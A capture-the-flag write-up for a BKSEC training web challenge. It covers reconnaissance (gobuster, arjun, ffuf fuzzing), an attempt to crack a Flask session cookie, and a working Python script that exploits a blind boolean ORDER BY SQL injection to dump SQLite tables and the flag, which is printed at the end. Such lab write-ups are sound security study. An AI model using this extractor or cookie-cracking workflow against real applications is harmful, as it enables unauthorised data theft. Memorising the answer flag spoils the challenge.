---
tags:
  - 🚩
up:
  - "[[02 - Data Exfiltration]]"
platform: BKSEC Training
difficulty: Easy
creation_date: 2026-02-24
last_modified: 2026-02-24
---

# 🚩 [[BKSEC - Ezzz]]
**Primary:** [[01 - Web Security]]

**Secondary:**  [[02 - Data Exfiltration]]

**Related Techniques:** [[(incomplete) SQL Injection|SQLi]] [[(incomplete) Server-side Request Forgery]]

## Executive Summary
* **URL:** `http://103.77.175.40:8211/`
* **Key Technique:** Spotting a parameter that is vulnerable to Boolean-based SQL Injection attack that leads to flag.
* **Status:** `Completed`

---

## Reconnaissance
### Gobuster Scans
```bash
gobuster dir -u http://103.77.175.40:8211/ -w ~/Downloads/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x php,html,txt,bak

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://103.77.175.40:8211/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Downloads/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,txt,bak,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/add                  (Status: 405) [Size: 153]
/sort                 (Status: 500) [Size: 126]
Progress: 88845 / 88845 (100.00%)
````
Two endpoints `/add` and `/sort` were found.

### Arjun Scans
```bash
arjun -u http://103.77.175.40:8211/          

[banner]
[*] Scanning 0/1: http://103.77.175.40:8211/
[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[+] Extracted 2 parameters from response for testing: date, title
[*] Logicforcing the URL endpoint
[!] No parameters were discovered.
```

```bash
arjun -u http://103.77.175.40:8211/sort
 
[Banner]
[*] Scanning 0/1: http://103.77.175.40:8211/sort
[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Logicforcing the URL endpoint
[!] No parameters were discovered.
```
### Web Enumeration
The website is a event management service where if I input an event and its date the event will be shown on the website.

In challenges like this, I often think about an SQLi vulnerability as the data are reflected to the user, especially when it is also under the format of some sort of table, just like in relational databases.

Looking at the requests, in the response to `/add` I found that the cookie is rather new that was not like previous challenges. 

![[Pasted image 20260224213718.png]]

The page is using Flask session cookie of the `itsdangerous` library ([[(incomplete) Cookie Forgery]]) that can be cracked for a secret key with a dictionary attack. So I tried extracting the cookie and cracking it with [Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign) against `rockyou.txt`.

```bash
flask-unsign --unsign --cookie 'eyJ1c2VyX3Nlc3Npb24iOiI1ZWEyYmMyOC04ZDNlLTQxZmMtOTFjZi01ZGE5Zjk0YjVjMDYifQ.aZ5fTA.4v8nGpMHWrmL3KAnEQ7YWSeigAU' --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
[*] Session decodes to: {'user_session': '5ea2bc28-8d3e-41fc-91cf-5da9f94b5c06'}
[*] Starting brute-forcer with 8 threads..
[!] Failed to find secret key after 14344392 attempts.nd
```

However, the cracking failed.

I tried fuzzing the input field with special characters to see if the input were unsanitized using both [[FFUF]] and manual fuzzing.

```bash
ffuf -w ~/Downloads/SecLists/Fuzzing/special-chars.txt \                  
     -X POST \
     -d "title=FUZZ&date=2026-02-01" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://103.77.175.40:8211/add
     
[Banner]
/                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 98ms]
,                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 98ms]
?                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 97ms]
{                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 98ms]
^                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 98ms]
>                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 98ms]
$                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 98ms]
:                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 98ms]
"                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 98ms]
~                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 98ms]
(                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 100ms]
)                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 100ms]
<                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 101ms]
|                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 106ms]
%                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 111ms]
;                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 114ms]
-                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 117ms]
\                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 121ms]
}                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 128ms]
'                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 131ms]
[                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 136ms]
.                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 140ms]
_                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 145ms]
+                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 148ms]
=                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 154ms]
#                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 162ms]
@                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 168ms]
!                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 172ms]
]                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 173ms]
`                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 176ms]
*                       [Status: 302, Size: 219, Words: 18, Lines: 6, Duration: 185ms]
:: Progress: [32/32] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

After the fuzzing, I found that these characters: ``/,?{^$:~()|%;-\}[]._+=#@!`*`` were not escaped. This might hinting some sort of Server-side Template Injection ([[(incomplete) Server-side Template Injection|SSTI]]) so I tried inputting `{{7*7}}` (Which is the correspond payload) into the title field. However, the payload also failed. 

![[Pasted image 20260225083428.png]]

 I even tried to examine the input with [[[(incomplete) SQLmap]]] but it was not use, none of the input field seemed to be injectable according to the tool. The tools still may be wrong though, but this time I think it was right since `'` and `"` were safely escaped. Same thing happened with `<` and `>` so maybe XSS is also not the way to go in this page.

I decided to go for the next target that is the `/sort` endpoint, according to the source code of the index page, the page has a parameter called `key` that takes the `title` or `date` as input when I clicked on the sorting buttons. This might be hinting an `ORDER BY` [[(incomplete) SQL Injection|SQLi]] vulnerability.

So I wanted to try the theory by injecting into the request the payload `title DESC`, however, the server seems to be implementing some sort of database wiping after a few seconds that every time I tried inputting a new event, the table was cleared out and only the newly input event was displayed.

Therefore, I decide to write a python script that can help me checking this.

```python
import requests
  
BASE = "http://103.77.175.40:8211"
s = requests.Session()
  
events = [
        {"title": "MMM_Test", "date": "2026-01-01"},
        {"title": "AAA_Test", "date": "2026-06-15"},
        {"title": "ZZZ_Test", "date": "2026-12-31"}
    ]
for event in events:
    response = s.post(BASE + '/add', data=event, allow_redirects=True)
    print(response.text)
  
payload = "title DESC"
params = {'key': payload}
response = s.get(BASE + '/sort', params=params)
print(response.text)
```

**Response of the third POST request:**

![[Pasted image 20260225085531.png]]

**Response of the GET request:**

![[Pasted image 20260225085614.png]]

The input was indeed sorted so this confirm the vulnerability.

---

## Boolean-based SQLi

With this, I asked Gemini to help me generate an exploit script that uses the fact that whether the input is alphabetically or inverse-alphabetically sorted.

```python
import requests
from bs4 import BeautifulSoup
import string
  
BASE = "http://103.77.175.40:8211"
CHARSET = string.ascii_letters + string.digits + " _-{}!"
  
s = requests.Session()
  
# inject data
def injectData():
    events = [
            {"title": "MMM_Test", "date": "2026-01-01"},
            {"title": "AAA_Test", "date": "2026-06-15"},
            {"title": "ZZZ_Test", "date": "2026-12-31"}
        ]
    for event in events:
        response = s.post(BASE + '/add', data=event, allow_redirects=True)
  
# check boolean-based SQLi
def checkBoolean(input):
    # if input is true, the order will be ZZZ, MMM, AAA; if false, it will be AAA, MMM, ZZZ
    payload = f"(CASE WHEN ({input}) THEN title END) DESC, title ASC"
    params = {'key': payload}
  
    response = s.get(BASE + '/sort', params=params)
    soup = BeautifulSoup(response.text, 'html.parser')
    rows = soup.find_all('tr')[1:]  # Skip header row
    titles = [row.find_all('td')[0].text.strip() for row in rows]
    
    if (titles[0] == "ZZZ_Test" and titles[1] == "MMM_Test" and titles[2] == "AAA_Test"):
       return True
    return False
  
def extract_data(query):
    extracted_string = ""
    position = 1
    
    print(f"[*] Starting extraction for query: {query}")
    
    while True:
        char_found = False
        for char in CHARSET:
            test_query = f"SUBSTR(({query}), {position}, 1) = '{char}'"
            
            print(f"\r[*] Trying: {extracted_string}{char}", end="", flush=True)
            
            if checkBoolean(test_query):
                extracted_string += char
                char_found = True
                position += 1
                break
        
        if not char_found:
            break
    
    print(f"\n[+] Extracted: {extracted_string}")
    return extracted_string

  

if __name__ == "__main__":
    injectData()
  
    query_to_run = "sqlite_version()"
    extract_data(query_to_run)
```

I changed the payload accordingly and got the database was using `SQLite`. 

Changing the `query_to_run` to:

```SQLite
SELECT tbl_name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0 --1,2,3...
```

And I managed to get 3 tables, using the payload:

```SQLite
SELECT name FROM pragma_table_info('lists') LIMIT 1 OFFSET 0
```

I can extract the columns and got some information about the tables:
- `sqlite_sequence`: a built-in table that is automatically created whenever the developer uses `AUTOINCREMENT` to increment primary keys like ids...
- `lists`: the table that contains the event that I input in the front-end. (columns: `id`, `title`, `date`)
- `flag42123`: the table that contains the flag. (columns: `id`, `flag`)

I can then extract the flag with a simple payload:
```SQLite
SELECT flag FROM flag42123 LIMIT 1
```

---

## Loot & Flags
**Flag:** BKSEC{B00l34n_4nd_3rr0r_B4s3d_SQLi_4r3_P0w3rfu1_T3cHn1qu3s_MHjQsk0ygYzovO6hwa_c58073fdf6c9eae0f13a6460d0c45659da9336448f0f5c12846e65ae}